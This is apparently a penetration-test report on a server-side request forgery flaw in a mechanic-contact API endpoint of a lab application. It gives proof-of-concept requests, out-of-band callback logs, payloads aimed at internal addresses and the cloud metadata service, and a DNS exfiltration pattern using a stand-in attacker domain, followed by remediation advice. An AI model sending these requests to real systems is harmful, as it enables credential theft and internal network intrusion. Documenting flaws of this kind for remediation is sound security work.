# Server-Side Request Forgery (SSRF) – Full Exploitation (Reflected + Blind + OAST)

---

## Summary

The endpoint:

```
POST /workshop/api/merchant/contact_mechanic
```

is vulnerable to **Server-Side Request Forgery (SSRF)** via the `mechanic_api` parameter.

An attacker can supply an arbitrary URL, causing the backend server to initiate HTTP requests to attacker-controlled or internal systems.

The vulnerability is confirmed as:

> **Fully exploitable SSRF (Reflected + Blind + Out-of-Band interaction)**

---

## Affected Endpoint

```
POST /workshop/api/merchant/contact_mechanic
```

---

## Vulnerable Parameter

```json
"mechanic_api": "<attacker-controlled URL>"
```

---

## Root Cause

* User input is directly used to perform server-side HTTP requests
* No validation or restriction on:

  * Protocols
  * Domains
  * IP ranges
* No allowlist enforcement

---

## Proof of Concept (PoC)

---

### 1. Reflected SSRF (External Request)

#### Request

```http
POST /workshop/api/merchant/contact_mechanic HTTP/1.1
Host: pentest.lab:8888
Content-Type: application/json
Authorization: Bearer <user_token>

{
  "mechanic_code": "TRAC_JME",
  "problem_details": "Balance and Alignment",
  "vin": "T2MT6EE7P7312F6WS",
  "mechanic_api": "http://www.google.com",
  "repeat_request_if_failed": false,
  "number_of_repeats": 1
}
```

#### Response (Truncated)

```json
{
  "response_from_mechanic_api": "<!doctype html><html>...Google HTML response...</html>",
  "status": 200
}
```

#### Observation

* The server fetches external content
* The response is reflected back to the client

---

### 2. Blind SSRF (No Response Reflection)

#### Request

```json
"mechanic_api": "http://attacker-domain.com"
```

#### Response

```json
{
  "response_from_mechanic_api": "",
  "status": 200
}
```

#### Observation

* No response is returned
* Backend request is still executed

---

### 3. Out-of-Band (OAST) Confirmation

#### Payload

```json
"mechanic_api": "http://d91gr9f9ks57s7tbgevgtccsij3ffpiti.oast.online"
```

#### Interactsh Logs

```
Received DNS interaction (A) from 105.112.239.208
Received DNS interaction (AAAA) from 105.112.239.208
Received HTTP interaction from 105.112.122.255
```

---

## Key Findings

### Confirmed Capabilities

* Server performs **DNS resolution** of attacker-controlled domains
* Server initiates **outbound HTTP requests**
* Requests occur even when responses are suppressed

---

## Impact

### 1. Internal Network Access

The attacker can target internal services:

```
http://127.0.0.1
http://localhost
http://192.168.0.0/16
```

---

### 2. Cloud Metadata Exposure (Critical)

Potential access to:

```
http://169.254.169.254/latest/meta-data/
```

This may expose:

* IAM credentials
* Access tokens
* Instance configuration

---

### 3. Blind Data Exfiltration

Using DNS-based techniques:

```
http://<sensitive-data>.attacker-domain.com
```

---

### 4. Internal Service Interaction

Even without response visibility:

* Admin endpoints may be triggered
* Jobs may be executed
* State changes may occur

---

### 5. Port Scanning / Service Discovery

Based on:

* Timing differences
* DNS/HTTP callbacks

---

## Severity

### **Critical**

Because:

* Arbitrary outbound requests are possible
* SSRF works in both reflected and blind modes
* External interaction (OAST) is confirmed
* Likely access to internal and cloud infrastructure

---

## Exploitation Maturity

* Reflected SSRF: ✅
* Blind SSRF: ✅
* DNS interaction: ✅
* HTTP interaction: ✅

> This represents **fully weaponizable SSRF**

---

## Recommendations

### 1. Enforce Allowlist

Only allow trusted endpoints:

```python
ALLOWED_DOMAINS = ["trusted-mechanic-api.com"]
```

---

### 2. Block Internal IP Ranges

Reject requests to:

* `127.0.0.1`
* `localhost`
* `169.254.169.254`
* Private IP ranges (RFC1918)

---

### 3. Validate DNS Resolution

Ensure resolved IPs are not:

* Internal
* Loopback
* Link-local

---

### 4. Disable Redirects

Prevent SSRF bypass via redirects.

---

### 5. Remove User-Controlled URLs

Replace:

```json
"mechanic_api": "<URL>"
```

With:

```json
"mechanic_code": "TRAC_JME"
```

And map internally.

---

## Conclusion

The application is vulnerable to **critical SSRF**, allowing attackers to:

* Force backend HTTP requests
* Interact with internal systems
* Exfiltrate data via OAST channels

This vulnerability is fully exploitable and poses a **significant risk to infrastructure and sensitive data**.

---

## Final Note

Given the confirmed outbound HTTP interaction and lack of restrictions, this issue should be treated as:

> **Critical – Immediate remediation required**
